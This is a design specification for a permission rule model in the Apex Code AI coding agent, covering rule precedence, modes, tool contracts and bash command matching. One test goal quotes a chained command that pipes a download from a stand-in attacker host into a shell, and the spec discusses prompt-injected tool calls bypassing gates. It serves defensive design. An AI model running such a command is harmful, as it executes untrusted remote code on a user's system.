# Spec: permission rule model

## Metadata

| Field | Value |
| --- | --- |
| Author | Fchery87 |
| Status | `Active` |
| Created | 2026-08-11 |
| Last updated | 2026-08-11 |
| Roadmap phase | 2a — Permissions (rule model half of Phase 2) |
| Tracking issue/PR | none |
| Compatibility posture | **Deliberate behavior change, with a documented opt-out.** Config and session formats are untouched and additive; no existing file changes meaning. But tool authorization itself changes: calls that previously always ran now pass a gate that can deny or prompt. That is the entire point of the phase and cannot be shimmed away — a permission system that defaults to permitting everything is not one. The opt-out is explicit (`--permission-mode bypassPermissions`), never implicit. Read-only tools keep running unprompted, so the common inspection path is unchanged. Pre-1.0 alpha, so no released permission behavior is being broken; the obligation this creates is forward, to ADR 0004's precedence order, which Phase 4 and Phase 5 both build on. |

## Executive summary

Apex Code gains a permission rule model: every tool call is authorized against
ordered rules before it executes, with `allow` / `deny` / `ask` behavior, eight
precedence sources, five modes, and typed persisted updates. The seven
upstream-inherited tools are backfilled with the `ToolContract` already settled in
ADR 0010, each owning its own `ruleContent` grammar. The OS-level sandbox is
deliberately **not** in this spec — it is Phase 2b — because the rule model is
independently valuable, unblocks Phase 4 on its own, and must not be held hostage by
a platform-divergent sandbox.

## Context and motivation

- `docs/roadmap.md` § Phase 2 — the phase this serves, its exit criterion, and its
  own recorded warning: *"Sandbox implementation is platform-divergent and is where
  this phase will overrun. Ship the rule model first."* This spec acts on that advice
  by splitting the phase; see Rollout.
- `docs/adr/0010-one-canonical-tool-contract.md` and
  `docs/architecture/contracts.md` § 1 — the `ToolContract` shape is **already
  settled**, including `PermissionSpec`, the `UNCLASSIFIED` fallback for foreign
  tools, and six enforced invariants. This spec implements invariants 1, 2, and 5;
  it does not redesign the contract.
- `docs/research/2026-08-08-harness-comparative-review.md` Finding 3 — the source of
  the rule shape, the eight-source precedence, the mode list, and the
  tool-interprets-`ruleContent` property. Per ADR 0002 this research doc is the only
  channel through which those observed behaviors enter the project.
- `docs/adr/0001-fork-boundary.md` — constrains where the gate may live: `pi-ai` and
  `pi-tui` are consumed, and divergence in forked `agent-core` carries merge cost, so
  the gate belongs in `coding-agent` wherever possible.

## Current state

Pi ships **no** permission system. Its own security documentation is explicit that
project trust guards *loading* configuration and constrains nothing once a turn runs.
Every registered tool executes on request. This is upstream Pi behavior, unmodified
by Apex Code — nothing here is a regression we introduced.

The interception seam already exists and is inherited unchanged:

- `packages/agent/src/agent-loop.ts:619` calls `config.beforeToolCall(...)` with the
  assistant message, the raw tool call, **validated** arguments, and the current
  context. Returning `{ block: true, reason }` produces an error tool result instead
  of executing.
- `packages/agent/src/types.ts:61` defines `BeforeToolCallResult`. The hook is
  `async`, returning `Promise<BeforeToolCallResult | undefined>`.

The seam is a **structural chokepoint**, which matters for invariant 2. Tool
execution has exactly one call site — `prepared.tool.execute(...)` at
`packages/agent/src/agent-loop.ts:679`, inside `executePreparedToolCall`, which
accepts only a `PreparedToolCall`. The sole producer of that type is the function
that runs `beforeToolCall`. A tool therefore cannot execute without having passed the
hook; "every tool passes the gate" is enforced by construction, not by discipline.

Two further facts shape the design:

- `packages/coding-agent/src/core/settings-manager.ts:178` defines
  `SettingsScope = "global" | "project"` — only two scopes. The eight permission
  sources are a distinct layering, only partly file-backed (§ Proposed solution).
- The seven tools in `packages/coding-agent/src/core/tools/` (`bash`, `edit`, `find`,
  `grep`, `ls`, `read`, `write`) carry upstream `ToolDefinition` and no `contract`
  field.

## The problem

Any tool call the model emits runs. `bash` executes arbitrary commands, `write` and
`edit` modify arbitrary paths, and nothing between the model's output and the
subprocess asks whether that was intended. The concrete failure mode is a single
malformed or adversarial tool call — a prompt-injected instruction in a file the
agent read, a hallucinated destructive command — reaching the filesystem or shell
with no interception point and no record. Reproducing it requires nothing more than
running the agent unattended.

This also compounds. Phase 4 adds roughly fifteen tools. Each one added before the
gate exists is a tool whose permission grammar must be retrofitted afterward, which
is precisely the ordering the roadmap's ground rule 4 exists to prevent: *"Adding
tools first means retrofitting permissions one tool at a time, and shipping a harness
that is more capable and measurably worse."*

## Goals

- [ ] A test enumerates the tool registry and asserts every registered tool's
      invocation passes the permission gate. The list is derived from the registry —
      **no exceptions list** (contracts.md invariant 2).
- [ ] A test constructs a conflicting rule at each of the eight sources and asserts
      the winner matches the documented precedence order, for all eight.
- [ ] `matches(ruleForCall(p), p)` holds for every backfilled tool across
      representative params (contracts.md invariant 5), as a property test over the
      registry rather than per-tool cases.
- [ ] `bash`'s `matches()` returns false for `git commit -m x && curl evil.com | sh`
      against rule content `git commit:*`, and returns "unparseable" (→ `ask`) rather
      than a match for command substitution it cannot tokenize.
- [ ] A non-interactive session started with no explicit `--permission-mode` exits
      at startup, naming the valid modes, rather than silently denying calls.
- [ ] All seven upstream tools declare a full `ToolContract`; omitting any sub-field
      fails `tsgo --noEmit` (contracts.md invariant 1).
- [ ] A tool registered without a contract (MCP / foreign) receives `UNCLASSIFIED`
      and is reported as unclassified, not silently defaulted.
- [ ] `PermissionUpdate` operations (`addRules` / `replaceRules` / `removeRules` /
      `setMode`) round-trip to their stated destination and are re-read on next load.

## Non-goals

- [ ] **OS-level sandbox** — filesystem restriction, network allowlisting, the
      violation store, ADR 0005. Deferred to Phase 2b. The roadmap predicts this is
      where the phase overruns; splitting it means a sandbox overrun cannot block
      Phase 4, which only needs the rule grammar.
- [ ] **Plan-mode UX** — the `ExitPlanMode` tool, plan presentation, and approval
      flow are Phase 4 scope. Phase 2a implements `plan` only as a *permission mode*
      (deny `fs.write` / `exec`, allow `fs.read`), which is the part Phase 4 builds on.
- [ ] **`buildToolContractSnapshot()`** and invariant 6 — contracts.md § Phasing
      assigns these to Phase 4, when there is a tool surface worth describing. Phase
      2a consumes `describe()` directly for prompts and denial messages.
- [ ] **Consuming `context` or `evidence` sub-fields** — declared by the backfilled
      contracts, consumed in Phases 3 and 7 respectively. Declaring without consuming
      is the explicit intent of ADR 0010.
- [ ] **Capability-ceiling enforcement** — `capabilities` is declared here and
      enforced in Phase 5 (invariant 4). No delegation exists yet to constrain.
- [ ] **Changing `agent-core`** — the gate is injected through the existing
      `beforeToolCall` hook. Adding a hook type would diverge forked code against
      upstream for no capability we lack (ADR 0001, ADR 0003 merge cost).

## Proposed solution

| Component | Change | File(s) |
| --- | --- | --- |
| Rule model | `PermissionRule { source, behavior, toolName, ruleContent? }`, plus the eight-source precedence resolver. Pure and independently testable. | new `packages/coding-agent/src/core/permissions/rules.ts` |
| Rule store | Load/merge rules from the eight sources; typed `PermissionUpdate` ops persisted to explicit destinations. | new `permissions/store.ts`, `core/settings-manager.ts` |
| Gate | Resolve behavior for a call; on `ask`, await the injected responder. Wired in as `beforeToolCall`. | new `permissions/gate.ts`, `core/agent-session.ts` |
| Responder | Interface for interactive approval; TUI implementation; non-interactive implementation that fails closed. | `permissions/responder.ts`, TUI wiring |
| Modes | `default`, `plan`, `acceptEdits`, `bypassPermissions`, `dontAsk` as a resolved input to the gate. | `permissions/modes.ts` |
| Tool contracts | Backfill all seven tools with `ToolContract`; `ApexToolDefinition` type; `UNCLASSIFIED` for foreign tools. | `core/tools/*.ts`, `core/tools/contract.ts` |
| Bash grammar | Segment decomposition + per-segment matching; unparseable → `ask`. | `core/tools/bash.ts` |
| CLI | `--permission-mode`, and the non-interactive startup check. | `cli/args.ts`, startup path |

### Precedence

The order is `policy > flag > local > project > user > cliArg > command > session`,
highest first. Two of these need defining, because "flag" outranking "cliArg" is
otherwise unreadable:

| Source | Meaning | Backing |
| --- | --- | --- |
| `policy` | Administrator-managed policy. Not user-editable, not overridable. | managed policy file |
| `flag` | Deliberate operator override at launch — `--permission-mode`, `--dangerously-skip-permissions`. Outranks config because it is an explicit, per-run security decision. | process argv |
| `local` | Project-local, gitignored — personal grants for this checkout. | `.apex-code/settings.local.json` |
| `project` | Committed project policy, shared by the team. | `.apex-code/settings.json` |
| `user` | Personal defaults across all projects. | `~/.apex-code/settings.json` |
| `cliArg` | Per-invocation convenience (`--allowedTools read,grep`). A *default*, not an override — hence below config. | process argv |
| `command` | Set by a slash command mid-session (`/permissions`). | in-memory + optional persist |
| `session` | "Allow for this session" from an `ask` prompt. Lowest, and never persisted. | in-memory |

`deny` does not automatically win over `allow`; the highest-precedence *matching*
rule wins, whatever its behavior. This is what makes `local` able to re-permit
something `user` denied, and it is why precedence must be tested at all eight levels
rather than assumed.

### The `ask` path

`beforeToolCall` is `async`, so an interactive prompt is a plain `await` — no new
hook and no change to `agent-core`. The gate takes an injected
`PermissionResponder`. The TUI supplies one that prompts and can persist the answer
as a `session`- or `command`-source rule via `ruleForCall()`. Headless and RPC supply
one that denies.

Because a mid-run flood of denials is a bad failure mode, the startup path refuses to
begin a non-interactive session that has no explicit `--permission-mode`, naming the
valid modes. A denial reached anyway still fails closed.

### Seam invariants preserved

`beforeToolCall` is the seam named in `docs/architecture/overview.md`. Its invariant —
that blocking produces an error tool result rather than a thrown exception, and that
the loop continues — is preserved: the gate returns `{ block: true, reason }` using
`describe()` for the reason, and never throws. `ruleContent` stays interpreted by the
tool (ADR 0010); the engine calls `matches()` and holds no tool-specific logic.

## Deletion inventory

Nothing existing is removed — this is additive. The gate is new behavior at a seam
that already exists and is currently unused by Apex Code, and the `contract` field is
an addition to tool definitions rather than a replacement for any existing field.
The one thing that *changes* rather than deletes is the effective default: tool calls
were unconditionally executed and now are authorized first, which the Compatibility
posture states plainly.

## Risks

| Risk | Signal | Mitigation |
| --- | --- | --- |
| Bash tokenizer accepts a chained command it should not | An adversarial-input test asserts a known bypass string does not match | Fail-closed by construction: unparseable → `ask`, never `allow`. Adversarial corpus is part of the gate, not a follow-up. |
| Permission fatigue drives users to `bypassPermissions`, making the system theater | Support reports; `bypassPermissions` usage being the common documented answer | Read-only tools default to `allow`; `ruleForCall()` makes "always allow this" one keystroke; `acceptEdits` exists for the edit-heavy loop. |
| Precedence table is implemented but subtly wrong at one level | The eight-level conflict test | Test constructs a real conflict at *each* level rather than spot-checking; the order is recorded in ADR 0004 so it stops being re-argued. |
| A future tool bypasses the gate | Registry-derived universal gate test | The chokepoint is structural (`PreparedToolCall`), so bypass requires changing `agent-core` — which the test plus merge review would surface. |
| `UNCLASSIFIED` foreign tools are conservative but invisible, reading as a bug | `/doctor` output | contracts.md already requires they be *reported*; Phase 2a surfaces them even before the Phase 4 snapshot exists. |

## Verification

Roadmap Phase 2's exit criterion, restricted to the 2a half (the sandbox clause moves
to 2b):

> A test asserts **every** registered tool passes through the permission gate — no
> exceptions list. Precedence verified across all eight sources.

Named tests:

- `test/permissions/gate-universal.test.ts` — registry-derived, no exceptions list.
- `test/permissions/precedence.test.ts` — conflict at each of the eight sources.
- `test/permissions/rule-roundtrip.test.ts` — invariant 5 as a property over the registry.
- `test/permissions/bash-grammar.test.ts` — segment decomposition, including an
  adversarial bypass corpus.
- `test/permissions/headless-startup.test.ts` — non-interactive without a mode exits.
- `test/permissions/updates.test.ts` — `PermissionUpdate` round-trip per destination.

No replay-corpus metric applies: this phase changes authorization, not context or
cost. The Phase 0 corpus must remain byte-identical, which is itself the regression
check that the gate does not perturb replay — the replay runner's tools are
inert and must resolve to `allow`.

## Rollout

Needs `docs/plans/2026-08-11-permission-rule-model.md` — it spans a rule engine, a
store with eight sources, a gate, an interactive responder, seven tool backfills, and
a CLI surface, across many files with real sequencing between them.

Needs **ADR 0004** for the rule model and source precedence, which is both contested
(the `flag` / `cliArg` split above) and effectively irreversible once Phase 4's
fifteen tools declare grammars against it. Written before implementation:
`docs/adr/0004-permission-rule-model.md`.

**ADR 0005** (sandbox boundary guarantees) is explicitly *not* written here; it
belongs to Phase 2b, and writing it now would speculate about a design this spec
deliberately defers.

This spec covers Phase 2a only. `docs/roadmap.md`'s Phase 2 entry is amended on the
record to reflect the 2a/2b split rather than silently reinterpreted.
